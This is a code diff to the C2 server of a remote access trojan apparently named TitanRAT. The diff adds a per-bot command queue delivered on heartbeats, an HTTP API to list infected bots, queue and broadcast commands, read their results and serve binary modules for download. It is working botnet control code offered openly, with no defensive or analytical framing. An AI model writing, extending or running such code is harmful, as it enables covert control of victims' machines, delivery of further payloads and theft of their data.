@@ -1,26 +1,46 @@
-// Server/Program.cs — ИСПРАВЛЕННЫЙ (Heartbeat Ping)
+// Server/Program.cs
 using System.Net;
 using System.Net.Sockets;
 using System.Collections.Concurrent;
+using System.Text;
+using System.Text.Json;
 using TitanRAT.Server;
+using System.Text.Json.Serialization;
 
 class Program
 {
     private static readonly ConcurrentDictionary<string, ClientSession> _clients = new();
     private static volatile bool _running = true;
-    private const int Port = 12345;
+    private const int TcpPort = 12345;
+    private const int HttpPort = 12346;
+    private static readonly CancellationTokenSource _httpCts = new();
     
     static async Task Main(string[] args)
     {
-        Console.WriteLine($"[C2] Starting server on port {Port}...");
+        Console.WriteLine($"[C2] Starting TCP server on port {TcpPort}...");
+        Console.WriteLine($"[C2] Starting HTTP API on port {HttpPort}...");
         
-        var listener = new TcpListener(IPAddress.Any, Port);
-        listener.Start();
+        // Start TCP listener
+        var tcpListener = new TcpListener(IPAddress.Any, TcpPort);
+        tcpListener.Start();
+        var tcpTask = Task.Run(() => AcceptTcpClientsAsync(tcpListener));
         
-        // Start console input handler
-        var consoleTask = Task.Run(HandleConsoleInput);
+        // Start HTTP API
+        var httpTask = Task.Run(() => RunHttpApiAsync(_httpCts.Token));
         
-        // Accept loop
+        // Console input loop
+        await HandleConsoleInputAsync();
+        
+        // Shutdown
+        _running = false;
+        _httpCts.Cancel();
+        tcpListener.Stop();
+        foreach (var session in _clients.Values) session.Close();
+        await Task.WhenAll(tcpTask, httpTask);
+    }
+    
+    private static async Task AcceptTcpClientsAsync(TcpListener listener)
+    {
         while (_running)
         {
             try
@@ -28,13 +48,8 @@ class Program
                 var client = await listener.AcceptTcpClientAsync();
                 _ = Task.Run(() => HandleClientAsync(client));
             }
-            catch when (_running) { /* Ignore errors during shutdown */ }
+            catch when (_running) { }
         }
-        
-        // Cleanup
-        listener.Stop();
-        foreach (var session in _clients.Values) session.Close();
-        await consoleTask;
     }
     
     private static async Task HandleClientAsync(TcpClient client)
@@ -59,24 +74,31 @@ class Program
             
             await session.SendCommandAsync($"ID:{session.Id}");
             
-            // Main loop: BEATs and responses
+            // Main loop
             while (_running)
             {
                 line = await session.ReadLineAsync();
-                if (line == null) break; // Disconnected
+                if (line == null) break;
                 
                 session.LastSeen = DateTime.UtcNow;
-                
+
                 if (line.StartsWith("BEAT:"))
                 {
-                    // FIX: Send 'ping' instead of 'ACK'.
-                    // Agent understands 'ping' and replies 'pong'.
-                    // This keeps the connection alive without error spam.
-                    await session.SendCommandAsync("ping");
+                    var cmd = session.GetPendingCommand();
+                    if (cmd != null)
+                    {
+                        Console.WriteLine($"[>] Sending queued command to {session.Id}: {cmd}");
+                        await session.SendCommandAsync(cmd);
+                    }
+                    else
+                    {
+                        // FIX: Send 'ping' to keep connection alive without errors
+                        await session.SendCommandAsync("ping");
+                    }
                 }
                 else
                 {
-                    // This is a response to a command we sent (e.g. from console)
+                    session.AddResponse(line);
                     Console.WriteLine($"[RESPONSE] {session.Id}: {line}");
                 }
             }
@@ -93,48 +115,188 @@ class Program
         }
     }
     
-    private static void HandleConsoleInput()
+    private static async Task RunHttpApiAsync(CancellationToken token)
+    {
+        var listener = new HttpListener();
+        listener.Prefixes.Add($"http://localhost:{HttpPort}/");
+        listener.Start();
+        
+        try
+        {
+            while (!token.IsCancellationRequested)
+            {
+                var context = await listener.GetContextAsync().WaitAsync(token);
+                _ = Task.Run(() => HandleHttpRequestAsync(context), token);
+            }
+        }
+        catch (OperationCanceledException) { }
+        finally
+        {
+            listener.Stop();
+        }
+    }
+    
+    private static async Task HandleHttpRequestAsync(HttpListenerContext context)
+    {
+        var request = context.Request;
+        var response = context.Response;
+        
+        try
+        {
+            var path = request.Url?.AbsolutePath ?? "/";
+            var method = request.HttpMethod.ToUpper();
+            
+            if (method == "GET" && path == "/clients")
+            {
+                var clients = _clients.Values.Select(c => new {
+                    id = c.Id,
+                    hostname = c.Hostname,
+                    lastSeen = c.LastSeen.ToString("o"),
+                    queueSize = c.QueueSize
+                }).ToArray();
+                await SendJsonAsync(response, clients);
+            }
+            else if (method == "POST" && path == "/send")
+            {
+                using var reader = new StreamReader(request.InputStream, request.ContentEncoding);
+                var body = await reader.ReadToEndAsync();
+                var payload = JsonSerializer.Deserialize<SendPayload>(body);
+                
+                if (payload != null && _clients.TryGetValue(payload.BotId, out var session))
+                {
+                    session.EnqueueCommand(payload.Command);
+                    await SendJsonAsync(response, new { success = true, message = "Command queued" });
+                }
+                else
+                {
+                    response.StatusCode = 404;
+                    await SendJsonAsync(response, new { error = "Bot not found" });
+                }
+            }
+            else if (method == "GET" && path.StartsWith("/results/"))
+            {
+                var botId = path["/results/".Length..];
+                if (_clients.TryGetValue(botId, out var session))
+                {
+                    var results = session.GetRecentResponses(20).ToArray();
+                    await SendJsonAsync(response, new { bot_id = botId, results });
+                }
+                else
+                {
+                    response.StatusCode = 404;
+                    await SendJsonAsync(response, new { error = "Bot not found" });
+                }
+            }
+            else if (method == "GET" && path.StartsWith("/modules/") && path.EndsWith(".bin"))
+            {
+                var moduleName = path["/modules/".Length..];
+                var modulePath = Path.Combine("modules", moduleName);
+                
+                if (File.Exists(modulePath))
+                {
+                    var fileBytes = await File.ReadAllBytesAsync(modulePath);
+                    response.ContentType = "application/octet-stream";
+                    response.ContentLength64 = fileBytes.Length;
+                    await response.OutputStream.WriteAsync(fileBytes, 0, fileBytes.Length);
+                }
+                else
+                {
+                    response.StatusCode = 404;
+                    await SendJsonAsync(response, new { error = "Module not found" });
+                }
+            }
+            else
+            {
+                response.StatusCode = 404;
+                await SendJsonAsync(response, new { error = "Not found" });
+            }
+        }
+        catch (Exception ex)
+        {
+            response.StatusCode = 500;
+            await SendJsonAsync(response, new { error = ex.Message });
+        }
+        finally
+        {
+            response.Close();
+        }
+    }
+    
+    private static async Task SendJsonAsync(HttpListenerResponse response, object data)
+    {
+        var json = JsonSerializer.Serialize(data);
+        var bytes = Encoding.UTF8.GetBytes(json);
+        response.ContentType = "application/json";
+        response.ContentLength64 = bytes.Length;
+        await response.OutputStream.WriteAsync(bytes, 0, bytes.Length);
+    }
+    
+    private static async Task HandleConsoleInputAsync()
     {
         while (_running)
         {
             var input = Console.ReadLine();
             if (string.IsNullOrWhiteSpace(input)) continue;
             
-            var parts = input.Split(' ', 2);
+            var parts = input.Split(' ', 3);
             var cmd = parts[0].ToLower();
             
             switch (cmd)
             {
                 case "list":
                     Console.WriteLine("\n[Connected Bots]");
-                    Console.WriteLine($"{"ID",-36} {"Hostname",-20} {"Last Seen"}");
-                    Console.WriteLine(new string('-', 70));
+                    Console.WriteLine($"{"ID",-36} {"Hostname",-20} {"Last Seen"} {"Queue"}");
+                    Console.WriteLine(new string('-', 75));
                     foreach (var c in _clients.Values)
-                        Console.WriteLine($"{c.Id,-36} {c.Hostname,-20} {c.LastSeen:HH:mm:ss}");
+                        Console.WriteLine($"{c.Id,-36} {c.Hostname,-20} {c.LastSeen:HH:mm:ss} {c.QueueSize}");
                     Console.WriteLine();
                     break;
                     
                 case "send":
-                    if (parts.Length < 2) { Console.WriteLine("Usage: send <id> <command>"); break; }
-                    var sendParts = parts[1].Split(' ', 2);
-                    if (sendParts.Length < 2) { Console.WriteLine("Usage: send <id> <command>"); break; }
-                    
-                    if (_clients.TryGetValue(sendParts[0], out var target))
+                    if (parts.Length < 3) { Console.WriteLine("Usage: send <id> <command>"); break; }
+                    if (_clients.TryGetValue(parts[1], out var target))
                     {
-                        Console.WriteLine($"[>] Sending to {sendParts[0]}: {sendParts[1]}");
-                        _ = target.SendCommandAsync(sendParts[1]);
+                        target.EnqueueCommand(parts[2]);
+                        Console.WriteLine($"[>] Command queued for {parts[1]}: {parts[2]}");
                     }
                     else
                     {
-                        Console.WriteLine($"[!] Bot {sendParts[0]} not found");
+                        Console.WriteLine($"[!] Bot {parts[1]} not found");
+                    }
+                    break;
+                    
+                case "queue":
+                    if (parts.Length < 2) { Console.WriteLine("Usage: queue <id>"); break; }
+                    if (_clients.TryGetValue(parts[1], out var qSession))
+                    {
+                        Console.WriteLine($"\n[Queue for {parts[1]}] (size: {qSession.QueueSize})");
+                        // Note: ConcurrentQueue doesn't allow enumeration, so we just show size
+                        Console.WriteLine("(Commands are delivered on next heartbeat)");
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[!] Bot {parts[1]} not found");
+                    }
+                    break;
+                    
+                case "clear_queue":
+                    if (parts.Length < 2) { Console.WriteLine("Usage: clear_queue <id>"); break; }
+                    if (_clients.TryGetValue(parts[1], out var cSession))
+                    {
+                        cSession.ClearQueue();
+                        Console.WriteLine($"[>] Queue cleared for {parts[1]}");
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[!] Bot {parts[1]} not found");
                     }
                     break;
                     
                 case "broadcast":
                     if (parts.Length < 2) { Console.WriteLine("Usage: broadcast <command>"); break; }
-                    Console.WriteLine($"[>] Broadcasting: {parts[1]}");
                     foreach (var c in _clients.Values)
-                        _ = c.SendCommandAsync(parts[1]);
+                        c.EnqueueCommand(parts[1]);
+                    Console.WriteLine($"[>] Command broadcast to {_clients.Count} bots");
                     break;
                     
                 case "quit":
@@ -148,4 +310,14 @@ class Program
             }
         }
     }
+}
+
+// Helper class for JSON deserialization
+class SendPayload
+{
+    [JsonPropertyName("bot_id")]
+    public string BotId { get; set; } = "";
+    
+    [JsonPropertyName("command")]
+    public string Command { get; set; } = "";
 }
